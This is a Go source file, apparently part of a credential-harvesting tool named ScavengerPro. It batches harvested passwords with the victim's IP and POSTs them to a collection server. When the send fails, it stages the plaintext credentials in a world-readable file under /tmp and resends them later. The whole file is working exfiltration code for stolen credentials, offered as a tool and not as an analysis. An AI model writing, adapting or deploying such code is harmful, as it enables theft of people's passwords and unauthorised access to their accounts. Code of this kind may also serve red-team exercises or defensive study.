// ship the credential cache to the server
// @author: degenerat3

package main

import (
	"ScavengerPro/client/cred_cache"
	"bufio"
	"bytes"
	"encoding/json"
	"io/ioutil"
	"net/http"
	"os"
)

var serv = "127.0.0.1:5000" //IP of server

// This function will extract info from CredCache object and ship it back
// to the web server.  If the POST request fails, write the cache data to
// a file in temp, so it can be shipped later
func sendData(c *cred_cache.CredCache) {
	path := "/tmp/cachedump"
	ip := c.GetIP()
	creds := c.GetEntries()
	previousDump := fetchDump(path)
	if previousDump != nil {
		for _, c := range previousDump {
			creds = append(creds, c)
		}
	}
	credStr := ""
	for _, cd := range creds {
		credStr += cd + "\n"
	}
	url := "http://" + serv + "/scavpro" //turn ip into URL
	jsonData := map[string]string{"IP": ip, "credentials": credStr}
	jsonValue, _ := json.Marshal(jsonData)
	_, err := http.Post(url, "application/json", bytes.NewBuffer(jsonValue))
	if err != nil {
		// TODO: write to disk if it fails
		path := "/tmp/cachedump"
		dumpCache(creds, path)
		return
	}
	c.ClearEntries() // reset credential entries in cache

}

// This function writes the credentials from a cred_cache object to
// a specified file path
func dumpCache(creds []string, path string) {
	cstr := ""
	for _, cred := range creds {
		cstr += cred + "\n"
	}
	cbytes := []byte(cstr)
	ioutil.WriteFile(path, cbytes, 0644)

	return
}

// This function reads the credential dump from specified path and returns
// it as a []string
func fetchDump(path string) []string {
	f, err := os.Open(path)
	if err != nil {
		return nil
	}
	defer f.Close()
	var data []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		data = append(data, scanner.Text())
	}

	return data
}

// This function will be called by other programs, checks to see if we have
// enough entries to bother shipping them
func shipIt(c *cred_cache.CredCache, min int) {
	if c.CountEntries() < min {
		return // not enough passwords to ship
	}
	sendData(c)
	return
}
